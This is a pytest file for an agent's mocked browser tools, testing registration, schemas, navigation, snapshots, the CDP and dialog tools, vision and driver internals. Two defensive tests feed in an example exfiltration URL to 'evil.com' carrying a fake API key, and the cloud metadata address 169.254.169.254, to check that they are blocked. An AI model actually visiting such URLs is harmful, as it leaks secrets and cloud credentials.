"""Tests for the browser tool suite (builtin/browser.py + _browser_driver.py).

The agent-browser CLI subprocess is MOCKED throughout — no real browser/Chromium
is required. We assert: registration + schema parity with hermes, the
availability gate, arg plumbing into the driver, the snapshot @eN ref flow, the
secret-exfil + cloud-metadata guards, and the JS-eval / dialog / cdp paths.
"""
from __future__ import annotations

import json

import pytest

from lunamoth.tools.builtin import browser, _browser_driver as drv
from lunamoth.tools.registry import registry, discover_builtin_tools


# ---------------------------------------------------------------------------
# Fakes
# ---------------------------------------------------------------------------

class FakeCtx:
    """Minimal ToolContext stand-in. ``browser`` holds the ephemeral session
    store the driver stashes; ``run_terminal`` is never reached because we mock
    ``run_browser_command`` directly in most tests."""

    def __init__(self):
        self.browser = None
        self.llm = None
        self._terminal_calls = []

    def run_terminal(self, command, *, timeout=None, workdir=None, browser=False):
        self._terminal_calls.append((command, timeout))
        return ""

    def isolation(self):
        return "sandbox"


class DriverStub:
    """Records (command, args) and returns canned envelopes per command."""

    def __init__(self, responses=None):
        self.calls = []
        self.responses = responses or {}

    def __call__(self, ctx, task_id, command, args=None, timeout=None):
        self.calls.append((command, list(args or [])))
        resp = self.responses.get(command)
        if callable(resp):
            return resp(args or [])
        if resp is not None:
            return resp
        return {"success": True, "data": {}}


@pytest.fixture
def ctx():
    return FakeCtx()


@pytest.fixture(autouse=True)
def _always_available(monkeypatch):
    # Pretend the agent-browser CLI + Chromium are installed so the gate is open
    # and run_browser_command's pre-checks pass when not otherwise mocked.
    monkeypatch.setattr(drv, "find_agent_browser", lambda: "/usr/local/bin/agent-browser")
    monkeypatch.setattr(drv, "chromium_installed", lambda: True)


# ---------------------------------------------------------------------------
# Registration + schema parity
# ---------------------------------------------------------------------------

EXPECTED = [
    "browser_navigate", "browser_snapshot", "browser_click", "browser_type",
    "browser_scroll", "browser_back", "browser_press", "browser_get_images",
    "browser_vision", "browser_console", "browser_cdp", "browser_dialog",
]


def test_all_twelve_registered():
    for name in EXPECTED:
        assert registry.get_entry(name) is not None, f"{name} not registered"


def test_discovery_finds_browser_module():
    imported = discover_builtin_tools()
    assert "lunamoth.tools.builtin.browser" in imported
    names = registry.get_all_tool_names()
    for name in EXPECTED:
        assert name in names


def test_driver_not_discovered_as_tool_module():
    # The underscore helper must NOT be imported as a tool module.
    imported = discover_builtin_tools()
    assert "lunamoth.tools.builtin._browser_driver" not in imported


def test_all_in_browser_toolset():
    for name in EXPECTED:
        assert registry.get_entry(name).toolset == "browser"


def test_schemas_match_hermes_required_fields():
    assert browser.NAVIGATE_SCHEMA["parameters"]["required"] == ["url"]
    assert browser.SNAPSHOT_SCHEMA["parameters"]["required"] == []
    assert browser.SNAPSHOT_SCHEMA["parameters"]["properties"]["full"]["default"] is False
    assert browser.CLICK_SCHEMA["parameters"]["required"] == ["ref"]
    assert browser.TYPE_SCHEMA["parameters"]["required"] == ["ref", "text"]
    assert browser.SCROLL_SCHEMA["parameters"]["properties"]["direction"]["enum"] == ["up", "down"]
    assert browser.SCROLL_SCHEMA["parameters"]["required"] == ["direction"]
    assert browser.BACK_SCHEMA["parameters"]["required"] == []
    assert browser.PRESS_SCHEMA["parameters"]["required"] == ["key"]
    assert browser.GET_IMAGES_SCHEMA["parameters"]["required"] == []
    assert browser.VISION_SCHEMA["parameters"]["required"] == ["question"]
    assert browser.VISION_SCHEMA["parameters"]["properties"]["annotate"]["default"] is False
    assert browser.CONSOLE_SCHEMA["parameters"]["required"] == []
    assert browser.CDP_SCHEMA["parameters"]["required"] == ["method"]
    assert browser.DIALOG_SCHEMA["parameters"]["required"] == ["action"]
    assert browser.DIALOG_SCHEMA["parameters"]["properties"]["action"]["enum"] == ["accept", "dismiss"]


def test_task_id_not_in_any_schema():
    for name in EXPECTED:
        schema = registry.get_schema(name)
        assert "task_id" not in schema["parameters"]["properties"]


# ---------------------------------------------------------------------------
# Availability gate
# ---------------------------------------------------------------------------

def test_gate_hides_tools_when_driver_absent(monkeypatch):
    monkeypatch.setattr(drv, "find_agent_browser", lambda: None)
    monkeypatch.setattr(drv, "chromium_installed", lambda: True)
    assert drv.is_browser_available() is False
    defs = registry.get_definitions(EXPECTED, quiet=True)
    names = {d["function"]["name"] for d in defs}
    assert not (names & set(EXPECTED))


def test_gate_hides_tools_when_chromium_absent(monkeypatch):
    monkeypatch.setattr(drv, "find_agent_browser", lambda: "/bin/agent-browser")
    monkeypatch.setattr(drv, "chromium_installed", lambda: False)
    assert drv.is_browser_available() is False


def test_gate_open_when_both_present():
    assert drv.is_browser_available() is True


# ---------------------------------------------------------------------------
# navigate: guards + auto-snapshot ref flow
# ---------------------------------------------------------------------------

def test_navigate_blocks_secret_in_url(ctx, monkeypatch):
    stub = DriverStub()
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_navigate(
        {"url": "https://evil.com/steal?key=sk-ant-abcdefghijklmno"}, ctx))
    assert out["success"] is False
    assert "API key or token" in out["error"]
    assert stub.calls == []  # never navigated


def test_navigate_blocks_cloud_metadata(ctx, monkeypatch):
    stub = DriverStub()
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_navigate({"url": "http://169.254.169.254/latest/meta-data/"}, ctx))
    assert out["success"] is False
    assert "metadata" in out["error"].lower()
    assert stub.calls == []


def test_navigate_auto_snapshot_and_refs(ctx, monkeypatch):
    stub = DriverStub(responses={
        "open": {"success": True, "data": {"title": "Example", "url": "https://example.com"}},
        "snapshot": {"success": True, "data": {
            "snapshot": "button [@e1] Login\nlink [@e2] Home", "refs": {"e1": {}, "e2": {}}}},
    })
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_navigate({"url": "example.com"}, ctx))
    assert out["success"] is True
    assert out["url"] == "https://example.com"
    assert out["title"] == "Example"
    assert "@e1" in out["snapshot"]
    assert out["element_count"] == 2
    # url got normalized to https before the open call
    assert stub.calls[0] == ("open", ["https://example.com"])


def test_navigate_bot_detection_warning(ctx, monkeypatch):
    stub = DriverStub(responses={
        "open": {"success": True, "data": {"title": "Just a moment...", "url": "https://x.com"}},
        "snapshot": {"success": True, "data": {"snapshot": "", "refs": {}}},
    })
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_navigate({"url": "https://x.com"}, ctx))
    assert "bot_detection_warning" in out


def test_navigate_post_redirect_metadata_block(ctx, monkeypatch):
    stub = DriverStub(responses={
        "open": {"success": True, "data": {"title": "", "url": "http://169.254.169.254/"}},
    })
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_navigate({"url": "https://safe.example"}, ctx))
    assert out["success"] is False
    assert "metadata" in out["error"].lower()
    # navigated away to about:blank
    assert ("open", ["about:blank"]) in stub.calls


def test_navigate_failure_surfaces_error(ctx, monkeypatch):
    stub = DriverStub(responses={"open": {"success": False, "error": "boom"}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_navigate({"url": "https://x.com"}, ctx))
    assert out["success"] is False
    assert out["error"] == "boom"


# ---------------------------------------------------------------------------
# snapshot / click / type / scroll / back / press
# ---------------------------------------------------------------------------

def test_snapshot_compact_default(ctx, monkeypatch):
    stub = DriverStub(responses={
        "snapshot": {"success": True, "data": {"snapshot": "x [@e1]", "refs": {"e1": {}}}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_snapshot({}, ctx))
    assert out["success"] is True
    assert out["element_count"] == 1
    assert stub.calls[0] == ("snapshot", ["-c"])


def test_snapshot_full(ctx, monkeypatch):
    stub = DriverStub(responses={"snapshot": {"success": True, "data": {"snapshot": "tree", "refs": {}}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    json.loads(browser.browser_snapshot({"full": True}, ctx))
    assert stub.calls[0] == ("snapshot", [])


def test_snapshot_truncates_oversized(ctx, monkeypatch):
    big = "a" * (drv.SNAPSHOT_SUMMARIZE_THRESHOLD + 500)
    stub = DriverStub(responses={"snapshot": {"success": True, "data": {"snapshot": big, "refs": {}}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_snapshot({}, ctx))
    assert len(out["snapshot"]) < len(big)
    assert "truncated" in out["snapshot"]


def test_snapshot_surfaces_pending_dialogs(ctx, monkeypatch):
    stub = DriverStub(responses={"snapshot": {"success": True, "data": {
        "snapshot": "", "refs": {}, "pending_dialogs": [{"id": "d1", "type": "alert", "message": "hi"}]}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_snapshot({}, ctx))
    assert out["pending_dialogs"][0]["id"] == "d1"


def test_click_auto_prefixes_ref(ctx, monkeypatch):
    stub = DriverStub(responses={"click": {"success": True, "data": {}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_click({"ref": "e5"}, ctx))
    assert out["clicked"] == "@e5"
    assert stub.calls[0] == ("click", ["@e5"])


def test_type_uses_fill_clears_then_types(ctx, monkeypatch):
    stub = DriverStub(responses={"fill": {"success": True, "data": {}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_type({"ref": "@e3", "text": "hello"}, ctx))
    assert out["typed"] == "hello"
    assert out["element"] == "@e3"
    assert stub.calls[0] == ("fill", ["@e3", "hello"])


def test_scroll_validates_direction(ctx, monkeypatch):
    stub = DriverStub()
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_scroll({"direction": "sideways"}, ctx))
    assert out["success"] is False
    assert stub.calls == []


def test_scroll_500_pixels(ctx, monkeypatch):
    stub = DriverStub(responses={"scroll": {"success": True, "data": {}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    json.loads(browser.browser_scroll({"direction": "down"}, ctx))
    assert stub.calls[0] == ("scroll", ["down", "500"])


def test_back_returns_url(ctx, monkeypatch):
    stub = DriverStub(responses={"back": {"success": True, "data": {"url": "https://prev"}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_back({}, ctx))
    assert out["url"] == "https://prev"


def test_press_plumbs_key(ctx, monkeypatch):
    stub = DriverStub(responses={"press": {"success": True, "data": {}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_press({"key": "Enter"}, ctx))
    assert out["pressed"] == "Enter"
    assert stub.calls[0] == ("press", ["Enter"])


# ---------------------------------------------------------------------------
# get_images / console / eval
# ---------------------------------------------------------------------------

def test_get_images_parses_eval_json(ctx, monkeypatch):
    imgs = [{"src": "https://x/a.png", "alt": "a", "width": 10, "height": 10}]
    stub = DriverStub(responses={"eval": {"success": True, "data": {"result": json.dumps(imgs)}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_get_images({}, ctx))
    assert out["count"] == 1
    assert out["images"][0]["src"] == "https://x/a.png"
    assert stub.calls[0][0] == "eval"


def test_console_reads_messages_and_errors(ctx, monkeypatch):
    stub = DriverStub(responses={
        "console": {"success": True, "data": {"messages": [{"type": "log", "text": "hi"}]}},
        "errors": {"success": True, "data": {"errors": [{"message": "boom"}]}},
    })
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_console({}, ctx))
    assert out["total_messages"] == 1
    assert out["total_errors"] == 1
    assert out["console_messages"][0]["text"] == "hi"
    assert out["js_errors"][0]["message"] == "boom"


def test_console_clear_passes_flag(ctx, monkeypatch):
    stub = DriverStub(responses={
        "console": {"success": True, "data": {"messages": []}},
        "errors": {"success": True, "data": {"errors": []}},
    })
    monkeypatch.setattr(drv, "run_browser_command", stub)
    browser.browser_console({"clear": True}, ctx)
    assert ("console", ["--clear"]) in stub.calls
    assert ("errors", ["--clear"]) in stub.calls


def test_console_eval_mode(ctx, monkeypatch):
    stub = DriverStub(responses={"eval": {"success": True, "data": {"result": "\"Example\""}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_console({"expression": "document.title"}, ctx))
    assert out["success"] is True
    assert out["result"] == "Example"
    assert out["result_type"] == "str"
    assert stub.calls[0] == ("eval", ["document.title"])


def test_console_eval_dom_reference_error(ctx, monkeypatch):
    stub = DriverStub(responses={"eval": {"success": False, "error": "Object reference chain is too long"}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_console({"expression": "document.body"}, ctx))
    assert out["success"] is False
    assert "can't be serialized" in out["error"]


# ---------------------------------------------------------------------------
# cdp / dialog
# ---------------------------------------------------------------------------

def test_cdp_requires_method(ctx, monkeypatch):
    monkeypatch.setattr(drv, "run_browser_command", DriverStub())
    out = json.loads(browser.browser_cdp({}, ctx))
    assert "error" in out


def test_cdp_plumbs_method_and_params(ctx, monkeypatch):
    stub = DriverStub(responses={"cdp": {"success": True, "data": {"result": {"targetInfos": []}}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_cdp({"method": "Target.getTargets", "params": {}}, ctx))
    assert out["success"] is True
    assert out["method"] == "Target.getTargets"
    cmd, args = stub.calls[0]
    assert cmd == "cdp"
    assert "Target.getTargets" in args
    assert "--params" in args


def test_cdp_forwards_target_id(ctx, monkeypatch):
    stub = DriverStub(responses={"cdp": {"success": True, "data": {"result": {}}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_cdp(
        {"method": "Runtime.evaluate", "params": {"expression": "1"}, "target_id": "T1"}, ctx))
    assert out["target_id"] == "T1"
    _, args = stub.calls[0]
    assert "--target-id" in args and "T1" in args


def test_cdp_timeout_clamped(ctx, monkeypatch):
    seen = {}

    def stub(ctx, task_id, command, args=None, timeout=None):
        seen["timeout"] = timeout
        return {"success": True, "data": {"result": {}}}

    monkeypatch.setattr(drv, "run_browser_command", stub)
    browser.browser_cdp({"method": "X", "timeout": 9999}, ctx)
    assert seen["timeout"] == 300


def test_dialog_requires_valid_action(ctx, monkeypatch):
    monkeypatch.setattr(drv, "run_browser_command", DriverStub())
    out = json.loads(browser.browser_dialog({"action": "frobnicate"}, ctx))
    assert out["success"] is False


def test_dialog_accept_with_prompt_text(ctx, monkeypatch):
    stub = DriverStub(responses={"dialog": {"success": True, "data": {"dialog": {"type": "prompt"}}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_dialog(
        {"action": "accept", "prompt_text": "yes", "dialog_id": "d1"}, ctx))
    assert out["success"] is True
    assert out["action"] == "accept"
    cmd, args = stub.calls[0]
    assert cmd == "dialog"
    assert args[0] == "accept"
    assert "--prompt-text" in args and "yes" in args
    assert "--dialog-id" in args and "d1" in args


# ---------------------------------------------------------------------------
# vision (driver mocked; no real screenshot)
# ---------------------------------------------------------------------------

def test_vision_missing_screenshot_file_errors(ctx, monkeypatch, tmp_path):
    # Driver claims success but writes no file → clear error, no fabrication.
    stub = DriverStub(responses={"screenshot": {"success": True, "data": {}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_vision({"question": "what is here?"}, ctx))
    assert out["success"] is False
    assert "Screenshot file was not created" in out["error"]


def test_vision_returns_path_without_vision_llm(ctx, monkeypatch, tmp_path):
    shot = tmp_path / "shot.png"
    shot.write_bytes(b"\x89PNG\r\n")
    stub = DriverStub(responses={"screenshot": {"success": True, "data": {"path": str(shot)}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_vision({"question": "q"}, ctx))
    assert out["success"] is True
    assert out["screenshot_path"] == str(shot)
    # No vision LLM → no fabricated analysis, just a note with the MEDIA path.
    assert "analysis" not in out
    assert "MEDIA:" in out["note"]


def test_vision_uses_aux_vision_model(ctx, monkeypatch, tmp_path):
    shot = tmp_path / "shot.png"
    shot.write_bytes(b"\x89PNG\r\n")

    class LLM:
        def analyze_image(self, path, question):
            return "I see a login form."

    ctx.llm = LLM()
    stub = DriverStub(responses={"screenshot": {"success": True, "data": {"path": str(shot)}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_vision({"question": "q"}, ctx))
    assert out["analysis"] == "I see a login form."


def test_vision_native_defers_to_agent_no_aux_call(ctx, monkeypatch, tmp_path):
    # A main model WITH native vision: the tool must NOT spend an aux call — it sets
    # vision_native + the path, and the agent inlines the pixels next turn.
    shot = tmp_path / "shot.png"
    shot.write_bytes(b"\x89PNG\r\n")

    class LLM:
        def vision_supported(self):
            return True

        def analyze_image(self, path, question):  # must never be called
            raise AssertionError("native vision must not call the aux vision model")

    ctx.llm = LLM()
    stub = DriverStub(responses={"screenshot": {"success": True, "data": {"path": str(shot)}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    out = json.loads(browser.browser_vision({"question": "what is here?"}, ctx))
    assert out["success"] is True and out["vision_native"] is True
    assert out["screenshot_path"] == str(shot)
    assert out["question"] == "what is here?"
    assert "analysis" not in out          # native → agent inlines; no aux text


def test_vision_annotate_flag(ctx, monkeypatch, tmp_path):
    shot = tmp_path / "shot.png"
    shot.write_bytes(b"\x89PNG\r\n")
    stub = DriverStub(responses={"screenshot": {"success": True, "data": {"path": str(shot)}}})
    monkeypatch.setattr(drv, "run_browser_command", stub)
    browser.browser_vision({"question": "q", "annotate": True}, ctx)
    _, args = stub.calls[0]
    assert "--annotate" in args


# ---------------------------------------------------------------------------
# driver internals: temp-file capture (the #1 foot-gun) + session reuse
# ---------------------------------------------------------------------------

def test_run_browser_command_uses_temp_files_not_pipes(ctx, monkeypatch, tmp_path):
    # Force a known socket dir under tmp and have run_terminal write the stdout
    # file as agent-browser's redirect would. Assert the command redirects to a
    # file and that NO pipe is used (no capture of run_terminal's return value).
    monkeypatch.setattr(drv, "_socket_safe_tmpdir", lambda: str(tmp_path))

    captured = {}

    def fake_run_terminal(command, *, timeout=None, workdir=None, browser=False):
        captured["command"] = command
        # Emulate agent-browser writing JSON to the redirected stdout file.
        # Parse the `> <path>` target out of the command and write to it.
        import shlex as _shlex
        toks = _shlex.split(command)
        gt = toks.index(">")
        out_path = toks[gt + 1]
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(json.dumps({"success": True, "data": {"title": "ok"}}))
        return ""

    ctx.run_terminal = fake_run_terminal
    result = drv.run_browser_command(ctx, "default", "open", ["https://example.com"], timeout=5)
    assert result["success"] is True
    assert result["data"]["title"] == "ok"
    # redirect to a file, stdin detached — not a pipe
    assert " > " in captured["command"]
    assert "2>" in captured["command"]
    assert "< /dev/null" in captured["command"]
    # idle-timeout + socket dir env baked in
    assert "AGENT_BROWSER_SOCKET_DIR=" in captured["command"]
    assert "AGENT_BROWSER_IDLE_TIMEOUT_MS=" in captured["command"]


def test_run_browser_command_empty_output_is_failure(ctx, monkeypatch, tmp_path):
    monkeypatch.setattr(drv, "_socket_safe_tmpdir", lambda: str(tmp_path))

    def fake_run_terminal(command, *, timeout=None, workdir=None, browser=False):
        return ""  # no stdout file written → empty

    ctx.run_terminal = fake_run_terminal
    result = drv.run_browser_command(ctx, "default", "click", ["@e1"], timeout=5)
    assert result["success"] is False
    assert "no output" in result["error"]


def test_run_browser_command_close_empty_ok(ctx, monkeypatch, tmp_path):
    monkeypatch.setattr(drv, "_socket_safe_tmpdir", lambda: str(tmp_path))
    ctx.run_terminal = lambda command, *, timeout=None, workdir=None, browser=False: ""
    result = drv.run_browser_command(ctx, "default", "close", [], timeout=5)
    assert result["success"] is True


def test_run_browser_command_no_cli(ctx, monkeypatch):
    monkeypatch.setattr(drv, "find_agent_browser", lambda: None)
    result = drv.run_browser_command(ctx, "default", "open", ["https://x"], timeout=5)
    assert result["success"] is False
    assert "agent-browser CLI not found" in result["error"]


def test_run_browser_command_no_chromium(ctx, monkeypatch):
    monkeypatch.setattr(drv, "chromium_installed", lambda: False)
    result = drv.run_browser_command(ctx, "default", "open", ["https://x"], timeout=5)
    assert result["success"] is False
    assert "Chromium" in result["error"]


def test_session_name_reused_across_calls(ctx):
    sessions = drv._ctx_sessions(ctx)
    a = sessions.get_or_create("default")
    b = sessions.get_or_create("default")
    assert a["session_name"] == b["session_name"]
    assert a["session_name"].startswith("lm_")


def test_socket_safe_tmpdir_darwin(monkeypatch):
    monkeypatch.setattr(drv.sys, "platform", "darwin")
    assert drv._socket_safe_tmpdir() == "/tmp"
